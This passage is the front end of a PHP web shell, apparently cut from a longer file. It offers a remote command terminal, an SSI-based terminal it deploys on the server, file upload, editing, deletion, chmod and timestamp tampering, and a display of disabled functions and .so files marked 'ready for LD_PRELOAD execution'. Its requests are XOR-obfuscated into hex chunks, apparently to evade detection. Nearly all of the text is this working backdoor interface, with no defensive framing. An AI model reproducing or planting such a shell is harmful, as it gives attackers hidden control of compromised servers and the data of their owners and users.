.file-g{color:#2ecc71;font-weight:bold}
.file-w{color:#ecf0f1}
.ssi-overlay{display:none;position:fixed;inset:0;z-index:9999;background:rgba(0, 0, 0, .65);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);align-items:center;justify-content:center;padding:16px}
.ssi-overlay.show{display:flex}
.ssi-iframe-wrap{width:95%;max-width:960px;max-height:90vh;min-height:60vh;position:relative;border-radius:10px;overflow:hidden;box-shadow:0 0 40px rgba(0, 255, 136, .12), 0 20px 60px rgba(0, 0, 0, .7)}
.ssi-iframe-wrap iframe{width:100%;height:100%;border:0;position:absolute;inset:0}
@media (max-width:768px){*{-webkit-tap-highlight-color:transparent}body{font-size:13px}.h{position:sticky;top:0;z-index:120;padding:10px 12px;gap:6px;border-bottom:1px solid #1f3d1f;box-shadow:0 0 14px rgba(46,204,113,.25),0 2px 8px rgba(0,0,0,.6)}.h .bc{font-size:11px;line-height:1.6;word-break:break-all}.h a{font-size:12px}.infobar{padding:8px 12px;gap:6px 14px;font-size:10px;line-height:1.6}.infobar span{white-space:normal}.tb{padding:10px 12px;gap:8px;row-gap:10px}.tb input[type="text"]{flex:1 1 100%;min-width:0;padding:11px 10px;font-size:15px;border-radius:5px}.tb .btn{flex:1 1 auto;padding:11px 12px;font-size:12px;border-radius:5px;text-align:center}.btn{padding:9px 12px;font-size:12px;border-radius:5px}.btn:active{transform:scale(.95);filter:brightness(1.35)}.ok,.er,.so-info{margin:8px 12px;padding:10px 12px;font-size:12px;border-radius:5px}table{width:100%}thead th{font-size:10px;padding:8px}td{padding:9px 8px;font-size:13px}td:nth-child(3),thead th:nth-child(3),td:nth-child(4),thead th:nth-child(4),td:nth-child(5),thead th:nth-child(5),td:nth-child(6),thead th:nth-child(6),td:nth-child(7),thead th:nth-child(7){display:none}td:nth-child(2){word-break:break-all;line-height:1.4}td:nth-child(8){text-align:right;white-space:nowrap}.terminal{margin:10px 12px;padding:12px;border-radius:6px}.terminal .cmd-row{row-gap:8px}.terminal .cmd-row input,.terminal .cmd-row form input{min-width:0;width:100%;padding:11px 10px;font-size:15px;border-radius:5px}.terminal .cmd-row form{min-width:0}.terminal .out{max-height:45vh;font-size:12px;padding:10px}.terminal .ld-so-path input{width:100%}.editor{padding:12px}.editor textarea{height:55vh;font-size:13px;border-radius:5px}.bulk{padding:10px 12px;gap:10px;flex-wrap:wrap}.ssi-overlay{padding:0}.ssi-iframe-wrap{width:100%;max-width:100%;height:100vh;height:100dvh;max-height:100vh;max-height:100dvh;min-height:100vh;min-height:100dvh;border-radius:0}}
</style>
</head>
<body>
<div class="h">
<div class="bc"><?php echo $bc; ?></div>
<div>
<a href="#" onclick="go('<?php echo hx($sh); ?>');return false" style="color:#2ecc71;font-weight:bold;">[HOME]</a>
&nbsp;<a href="<?php echo $self; ?>?out=1" style="color:#e74c3c;font-weight:bold;">[LOGOUT]</a>
</div>
</div>
<div class="infobar">
<span>Server: <b><?php echo htmlspecialchars($serverSoft); ?></b></span>
<span>OS: <b><?php echo htmlspecialchars($osInfo); ?></b></span>
<span>User: <b><?php echo htmlspecialchars($user); ?></b></span>
<span>PHP: <b><?php echo htmlspecialchars($phpVer); ?></b></span>
</div>
<div class="infobar">
<span>Disable Functions:</span>
<?php if (empty($disabledList)): ?>
<span class="df-on">NONE</span>
<?php else: ?>
<a href="#" onclick="toggleDisabled();return false" style="color:#e74c3c;cursor:pointer;text-decoration:underline;" id="dfToggle">view more+</a>
<span id="dfFull" style="display:none;word-break:break-all;">
<?php foreach ($fnStatus as $fn => $ok): ?>
<span class="<?php echo $ok ? 'df-on' : 'df-off'; ?>"><?php echo $fn; ?></span>
<?php endforeach; ?>
&nbsp;<a href="#" onclick="toggleDisabled();return false" style="color:#888;font-size:10px;">hide</a>
</span>
<?php endif; ?>
</div>
<?php if (!$isWin && !empty($soFilesFound)): ?>
<div class="so-info">
<b style="color:#1abc9c;">.so LD_PRELOAD files found:</b>
<?php foreach ($soFilesFound as $so): ?>
<?php $soFull = $cw . DIRECTORY_SEPARATOR . $so; ?>
<span style="color:#2ecc71;"><?php echo htmlspecialchars($so); ?></span>
<span style="color:#888;">(<?php echo fmtSize(filesize($soFull)); ?>)</span>
<?php endforeach; ?>
— ready for LD_PRELOAD execution
</div>
<?php endif; ?>
<?php if ($msg) echo $msg; ?>
<div class="tb">
<input type="text" id="nf" placeholder="file.php" size="14" onkeydown="if(event.key==='Enter')act('nf',idVal('nf'))">
<button class="btn btn-g" onclick="act('nf',idVal('nf'))">+ File</button>
<input type="text" id="nd" placeholder="folder" size="14" onkeydown="if(event.key==='Enter')act('nd',idVal('nd'))">
<button class="btn btn-g" onclick="act('nd',idVal('nd'))">+ Folder</button>
<input type="file" id="fu" multiple onchange="handleUpload(this)" style="display:none">
<button class="btn btn-g" onclick="document.getElementById('fu').click()">Upload</button><span id="upSt" style="color:#2ecc71;font-size:10px;"></span>
<button class="btn btn-p" onclick="toggleTerm()">Terminal</button>
<?php if (!$isWin): ?><button class="btn btn-o" onclick="toggleSSI()">Terminal SSI</button><?php endif; ?>
</div>
<div class="terminal" id="termBox"<?php if ($term) echo ' style="display:block"'; ?>>
<h4>Console: <?php echo htmlspecialchars($cw); ?><?php if ($lockedMethod): ?> <span style="color:#f1c40f;font-size:11px;font-weight:normal;">[LOCKED: <?php echo htmlspecialchars($lockedMethod); ?>]</span> <a href="#" onclick="document.cookie='<?php echo $lockCookie; ?>=;Max-Age=0;path=/';location.reload();" style="color:#e74c3c;font-size:10px;text-decoration:none;">unlock</a><?php endif; ?></h4>
<div class="cmd-row">
<form autocomplete="on" onsubmit="execCmd();return false">
<input type="text" id="ci" name="cmd" placeholder="id">
</form>
<button class="btn btn-p" onclick="execCmd()">Run</button>
<button class="btn" onclick="toggleTerm()">Close</button>
</div>
<div class="out" id="ro"><?php if ($termOut) echo $termOut; ?></div>
</div>
<form id="_acf" target="_acfr" action="about:blank" style="display:none"><input type="text" name="cmd" autocomplete="on"></form>
<iframe name="_acfr" style="display:none"></iframe>
<div class="ssi-overlay" id="ssiOverlay" onclick="if(event.target===this)toggleSSI()">
<div class="ssi-iframe-wrap">
<iframe id="ssiFrame" src="about:blank"></iframe>
</div>
</div>
<?php if ($editFile !== ''): ?>
<div class="editor">
<div class="edh">
<h4 style="color:<?php echo is_writable($editFile) ? '#2ecc71' : '#ecf0f1'; ?>;">Edit: <?php echo htmlspecialchars(basename($editFile)); ?> <?php echo is_writable($editFile) ? '(writable)' : '(read-only)'; ?></h4>
<div style="display:flex;gap:8px;">
<button class="btn btn-g" onclick="saveEdit()">SAVE</button>
<button class="btn" onclick="go('<?php echo hx($cw); ?>')">CANCEL</button>
</div>
</div>
<textarea id="edContent" <?php echo is_writable($editFile) ? '' : 'readonly style="color:#888"'; ?>><?php echo htmlspecialchars($editContent); ?></textarea>
<input type="hidden" id="edPath" value="<?php echo htmlspecialchars($editFile); ?>">
</div>
<?php endif; ?>
<table>
<thead>
<tr>
<th style="width:30px;"><input type="checkbox" class="chk" id="sa" onchange="toggleAll(this)"></th>
<th>Name</th>
<th style="width:70px;">Perm</th>
<th style="width:80px;">Size</th>
<th style="width:160px;">Rename</th>
<th style="width:100px;">Chmod</th>
<th style="width:145px;">Date</th>
<th style="width:100px;">Actions</th>
</tr>
</thead>
<tbody>
<?php foreach (array_merge($dirs, $files) as $it): $fp = $cw . DIRECTORY_SEPARATOR . $it; $isD = is_dir($fp); $uid = md5($fp); $perm = file_exists($fp) ? substr(sprintf('%o', fileperms($fp)), -4) : '0000'; $date = file_exists($fp) ? @date('Y-m-d H:i', filemtime($fp)) : '-'; $size = $isD ? '-' : (file_exists($fp) ? fmtSize(filesize($fp)) : '-'); $dCls = dirClass($fp); $dCol = dirColor($fp); $writable = is_writable($fp); $eh = htmlspecialchars($fp); $ehjs = htmlspecialchars(str_replace(['\\', "'"], ['\\\\', "\\'"], $fp), ENT_QUOTES); $isSo = !$isD && preg_match('/\.so$/i', $it); ?>
<tr>
<td><input type="checkbox" class="chk bx" data-p="<?php echo $eh; ?>"></td>
<td>
<?php if ($isD): ?>
<a href="#" onclick="go('<?php echo hx($fp); ?>');return false" class="<?php echo $dCls; ?>">📁 <?php echo htmlspecialchars($it); ?></a>
<?php else: ?>
<span class="<?php echo $dCls; ?><?php echo $isSo ? ' so-info' : ''; ?>" style="<?php echo $isSo ? 'display:inline;padding:1px 4px;border-radius:2px;' : ''; ?>">📄 <?php echo htmlspecialchars($it); ?><?php echo $isSo ? ' *' : ''; ?></span>
<?php endif; ?>
</td>
<td style="color:<?php echo $writable ? '#2ecc71' : '#ecf0f1'; ?>;font-weight:bold;"><?php echo $perm; ?></td>
<td style="color:#666;"><?php echo $size; ?></td>
<td class="inline">
<input type="text" id="rn_<?php echo $uid; ?>" value="<?php echo htmlspecialchars($it); ?>" size="14" onkeydown="if(event.key==='Enter')act2('rn','<?php echo $ehjs; ?>',idVal('rn_<?php echo $uid; ?>'))">
<button type="button" class="btn" onclick="act2('rn','<?php echo $ehjs; ?>',idVal('rn_<?php echo $uid; ?>'))">Ren</button>
</td>
<td class="inline">
<input type="text" id="ch_<?php echo $uid; ?>" value="<?php echo $perm; ?>" style="width:48px;text-align:center;" onkeydown="if(event.key==='Enter')act2('ch','<?php echo $ehjs; ?>',idVal('ch_<?php echo $uid; ?>'))">
<button type="button" class="btn" onclick="act2('ch','<?php echo $ehjs; ?>',idVal('ch_<?php echo $uid; ?>'))">Set</button>
</td>
<td class="inline">
<input type="text" id="th_<?php echo $uid; ?>" value="<?php echo $date; ?>" style="width:115px;" onkeydown="if(event.key==='Enter')act2('th','<?php echo $ehjs; ?>',idVal('th_<?php echo $uid; ?>'))">
<button type="button" class="btn" onclick="act2('th','<?php echo $ehjs; ?>',idVal('th_<?php echo $uid; ?>'))">Upd</button>
</td>
<td>
<?php if (!$isD): ?><button type="button" class="btn" style="color:#3498db;" onclick="act('ed','<?php echo $ehjs; ?>')">Edit</button><?php endif; ?>
<button type="button" class="btn btn-r" onclick="if(confirm('Delete?'))act('dl','<?php echo $ehjs; ?>')">Del</button>
</td>
</tr>
<?php endforeach; ?>
</tbody>
</table>
<div class="bulk">
<span style="color:#888;font-size:11px;">Selected:</span>
<button type="button" class="btn btn-r" onclick="bulkDel()">Delete All</button>
<span style="color:#555;font-size:10px;margin-left:10px;">(<?php echo count($dirs) + count($files); ?> items)</span>
</div>
<script>
var XKEY='<?php echo $sk;?>';
var SELF='<?php echo $self;?>';
var CWD=<?php echo json_encode($cw);?>;
var POSTMAX=<?php echo $postMax;?>;
function enc(raw) {var kb=[],i,b;
for(i=0;i<XKEY.length;i++) kb.push(XKEY.charCodeAt(i)&255);
var u=[];
if(window.TextEncoder){var te=new TextEncoder();var ab=te.encode(raw);
for(i=0;i<ab.length;i++) u.push(ab[i]);}
else{var s=unescape(encodeURIComponent(raw));
for(i=0;i<s.length;i++) u.push(s.charCodeAt(i));}
var h='';
for(i=0;i<u.length;i++){b=(u[i]^kb[i%kb.length]).toString(16);
h+=('00'+b).slice(-2);}
return h;}
function buildAndSubmit(hexPayload) {var MAX_CHUNKS=16;
var k=Math.ceil(hexPayload.length/MAX_CHUNKS);
var form=document.createElement('form');
form.method='POST';
form.action=SELF;
form.style.display='none';
for(var i=0;i<MAX_CHUNKS;i++) {var chunk=hexPayload.substring(i*k,(i+1)*k);
if(!chunk) break;
var input=document.createElement('input');
input.type='hidden';
input.name='p'+i;
input.value=chunk;
form.appendChild(input);}
document.body.appendChild(form);
form.submit();}
function go(hexPath) {buildAndSubmit(hexPath);}
function act(code,val) {var p=CWD+'|'+code+'|'+val;
buildAndSubmit(enc(p));}
function act2(code,v1,v2) {var p=CWD+'|'+code+'|'+v1+'|'+v2;
buildAndSubmit(enc(p));}
function idVal(id) {return document.getElementById(id).value.trim();}
function execCmd() {var ci=document.getElementById('ci');var cmd=ci.value;if(!cmd)return;
var cmdB64=btoa(unescape(encodeURIComponent(cmd)));
var hf=document.getElementById('_acf');if(hf){hf.elements[0].value=cmd;hf.submit();}
ci.value='';act('ex',cmdB64);}
function bulkDel() {var cbs=document.querySelectorAll('.bx:checked');
if(!cbs.length) {alert('Select items!');return;}
if(!confirm('Delete '+cbs.length+' items?')) return;
var paths=[];cbs.forEach(function(b) {paths.push(b.getAttribute('data-p'));});
act('bd',paths.join('\n'));}
function saveEdit() {var content=document.getElementById('edContent').value;
var ep=document.getElementById('edPath').value;
var contentB64=btoa(unescape(encodeURIComponent(content)));
var p=CWD+'|sv|'+ep+'|'+contentB64;
buildAndSubmit(enc(p));}
function abToB64(buf) {var bin='',bytes=new Uint8Array(buf),i;
for(i=0;i<bytes.length;i+=0x8000){bin+=String.fromCharCode.apply(null,bytes.subarray(i,i+0x8000));}
return btoa(bin);}
function sendChunk(token,name,idx,total,b64) {
var p=CWD+'|upc|'+token+'|'+name+'|'+idx+'|'+total+'|'+b64;
var hex=enc(p),MAX_CHUNKS=16,k=Math.ceil(hex.length/MAX_CHUNKS),body='',i;
for(i=0;i<MAX_CHUNKS;i++){var c=hex.substring(i*k,(i+1)*k);if(!c)break;body+='p'+i+'='+encodeURIComponent(c)+'&';}
return fetch(SELF,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:body.slice(0,-1)}).then(function(r){return r.text();});}
function sendChunkRetry(token,name,idx,total,b64) {
return new Promise(function(res,rej){
var attempt=function(n){
sendChunk(token,name,idx,total,b64).then(function(t){
if(t==='1'){res(t);}else if(n>0){attempt(n-1);}else{rej(new Error('chunk'));}
}).catch(function(){if(n>0){attempt(n-1);}else{rej(new Error('net'));}});};
attempt(2);});}
function uploadOne(file,st) {
return new Promise(function(res,rej){
var fr=new FileReader();
fr.onload=function(e){
var ab=e.target.result,CH=131072,total=Math.max(1,Math.ceil(ab.byteLength/CH)),i,token='',cs='0123456789abcdef';
if(window.POSTMAX&&POSTMAX>0&&POSTMAX<1048576){CH=Math.max(32768,Math.floor(POSTMAX*0.3));total=Math.max(1,Math.ceil(ab.byteLength/CH));}
for(i=0;i<8;i++)token+=cs[Math.floor(Math.random()*16)];
(function step(i){
if(i>=total){res(true);return;}
var b64=abToB64(ab.slice(i*CH,(i+1)*CH));
if(st)st.textContent=file.name+' '+(i+1)+'/'+total;
sendChunkRetry(token,file.name,i,total,b64).then(function(){step(i+1);}).catch(function(){rej(new Error('chunk'));});
})(0);};
fr.onerror=function(){rej(new Error('read'));};
fr.readAsArrayBuffer(file);});}
function handleUpload(input) {
var files=input.files,st=document.getElementById('upSt');
if(!files.length)return;
var i=0,ok=0;
if(st)st.textContent='uploading '+files.length+' file(s)...';
(function next(){
if(i>=files.length){
if(st)st.textContent=ok+'/'+files.length+' uploaded';
input.value='';
if(ok>0)setTimeout(function(){location.reload();},500);
return;}
var f=files[i++];
if(st)st.textContent='uploading '+i+'/'+files.length+': '+f.name;
uploadOne(f,st).then(function(){ok++;next();}).catch(function(){next();});
})();}
function toggleTerm() {var t=document.getElementById('termBox');
var opening=(t.style.display==='none'||t.style.display==='');
t.style.display=opening?'block':'none';
if(opening){var ci=document.getElementById('ci');if(ci)setTimeout(function(){ci.focus();},50);}}
function toggleDisabled() {var el=document.getElementById('dfFull');
var tg=document.getElementById('dfToggle');
if(el.style.display==='none'||el.style.display==='') {el.style.display='inline';
tg.style.display='none';} else {el.style.display='none';
tg.style.display='inline';}}
function toggleAll(cb) {var boxes=document.querySelectorAll('.bx');
boxes.forEach(function(b) {b.checked=cb.checked;});}
var ssiDeployed=<?php echo $ssiDeployed?'true':'false';?>;
var ssiUrl=<?php echo json_encode($ssiUrl);?>;
function deploySSI(cb) {
var r=new XMLHttpRequest();
r.open('POST',SELF,true);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.onload=function() {
if(r.responseText==='1') {ssiDeployed=true;}
if(cb) cb(r.responseText==='1');
};
r.onerror=function() {if(cb) cb(false);};
r.send('_dep=1');
}
function cleanupSSI() {
var r=new XMLHttpRequest();
r.open('POST',SELF,true);
r.setRequestHeader('Content-Type','application/x-www-form-urlencoded');
r.send('_cln=1');
ssiDeployed=false;
}
function toggleSSI() {
var ov=document.getElementById('ssiOverlay');
if(ov.classList.contains('show')) {
ov.classList.remove('show');
document.getElementById('ssiFrame').src='about:blank';
return;
}
ov.classList.add('show');
if(!ssiDeployed) {
deploySSI(function(ok) {
document.getElementById('ssiFrame').src=ssiUrl+'?id';
});
} else {
document.getElementById('ssiFrame').src=ssiUrl+'?id';
}
}
window.addEventListener('message',function(e) {
if(e.data==='close') {
document.getElementById('ssiOverlay').classList.remove('show');
document.getElementById('ssiFrame').src='about:blank';
cleanupSSI();
}
});
(function(){
var tb=document.getElementById('termBox');
if(tb&&(tb.style.display==='block')){var ci=document.getElementById('ci');if(ci)ci.focus();}
})();
</script>
</body>
</html>